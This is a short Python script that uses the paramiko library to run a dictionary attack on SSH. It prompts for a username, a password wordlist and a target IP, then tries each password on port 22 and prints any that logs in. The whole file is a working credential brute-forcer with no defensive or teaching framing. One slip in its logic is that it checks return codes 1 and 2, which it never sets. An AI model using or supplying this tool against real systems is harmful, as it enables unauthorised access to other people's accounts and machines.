import paramiko
import os
import sys
import socket
from subprocess import Popen, PIPE

global username, pass_file, target_ip

try:
    username = input ("Please enter the username at the target machine> ")
    path = input ("Please enter the path & name of the file containing the passwords> ") 
    if os.path.exists(path) == False:   
        print ("The password file does not exist!")
        sys.exit(1)
    target_ip = input ("Please enter the IP address of the target> ")
    try:
        socket.inet_aton(target_ip)
    except socket.error as e:
        print (e)
        sys.exit(2)
except KeyboardInterrupt:
    print ("\nUser has interrupted the execution!\n")


def ssh_connect(password, ret_code = 0):
    ssh = paramiko.SSHClient()                                      
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target_ip, port=22, username=username,password=password)
    except paramiko.AuthenticationException:
        print ("Failed to authenticate! Password: %s" % (password))
        ret_code = 3
    except socket.error as e:
        ret_code = 4

    ssh.close()
    return ret_code

pass_file = open(path, 'r', encoding="ISO-8859-1")                  

for i in pass_file.readlines():
    password = i.strip("\n")

    try:
        response = ssh_connect(password)

        if response == 0:
            print ("Login successful! Password is: %s" % (password))
            # insert function call here
            sys.exit(0) 
        elif response == 1:
            print ("Login failed! Incorrect password: %s " % (password))
        elif response == 2:
            print ("Connection to the target failed!")
            sys.exit(5)

    except Exception as e:
        print (e)
        pass

pass_file.close()